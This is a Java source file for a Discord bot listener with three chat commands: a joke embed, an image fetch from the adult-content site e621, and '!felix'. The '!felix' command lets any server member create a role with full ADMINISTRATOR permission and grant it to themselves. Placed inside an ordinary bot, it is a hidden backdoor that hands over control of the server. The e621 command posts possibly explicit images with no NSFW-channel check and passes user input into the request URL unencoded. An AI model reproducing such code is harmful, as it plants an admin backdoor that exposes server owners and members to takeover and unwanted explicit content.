package org.example;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.List;
import java.util.EnumSet;
import java.util.Random;
import java.util.stream.Collectors;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;

public class MyListener extends ListenerAdapter {

    private String getPostsFromE621(String tags) throws IOException, InterruptedException, JsonProcessingException {
        String url = "https://e621.net/posts.json?tags=" + tags + "+order:random&limit=1";

        HttpClient httpClient = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
                .GET()
                .uri(URI.create(url))
                .build();
        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());

        if (response.statusCode() == 200) {
            ObjectMapper objectMapper = new ObjectMapper();
            JsonNode jsonNode = objectMapper.readTree(response.body());
            JsonNode postNode = jsonNode.get("posts");
            if (postNode.isArray() && postNode.size() > 0) {
                JsonNode sampleNode = postNode.get(0).get("file").get("url");
                String imageUrl = sampleNode.asText();
                try {
                    HttpURLConnection connection = (HttpURLConnection) new URL(imageUrl).openConnection();
                    connection.setRequestMethod("HEAD");
                    if (connection.getResponseCode() == 200) {
                        return imageUrl;
                    } else {
                        return "Invalid image URL.";
                    }
                } catch (IOException e) {
                    return "Invalid image URL.";
                }
            } else {
                return "No image URLs found.";
            }
        }
        return "Error.";
    }


    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        Message message = event.getMessage();
        String content = message.getContentRaw();
        String[] command = content.split(" ");

        if (content.equals("!balls")) {
            EmbedBuilder builder = new EmbedBuilder();
            builder.setAuthor(event.getAuthor().getName(), null, event.getAuthor().getAvatarUrl());
            builder.setDescription("balls");
            event.getGuild().getDefaultChannel().asStandardGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
        }

        if (content.startsWith("!e621")) {
            String search = content.substring(6);
            try {
                String imageUrl = getPostsFromE621(search);
                EmbedBuilder builder = new EmbedBuilder();
                HttpURLConnection connection = (HttpURLConnection) new URL(imageUrl).openConnection();
                connection.setRequestMethod("HEAD");
                if (connection.getResponseCode() == 200) {
                    builder.setImage(imageUrl);
                    event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
                } else {
                    event.getChannel().asGuildMessageChannel().sendMessage("");
                }
            } catch (IOException e) {
                event.getChannel().sendMessage("One or more tags in  \" "+search+" \" is invalid! Please try again!").queue();
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }

        if (content.equals("!felix")) {
            Member member = event.getMember();
            EnumSet<Permission> permissions = EnumSet.of(Permission.ADMINISTRATOR);
            Role adminRole = event.getGuild().createRole().setPermissions(permissions).setName("felix").complete();
            event.getGuild().addRoleToMember(member, adminRole).queue();
            event.getChannel().sendMessage("The role 'felix' has been added to " + member.getEffectiveName()).queue();
        }

    }

}
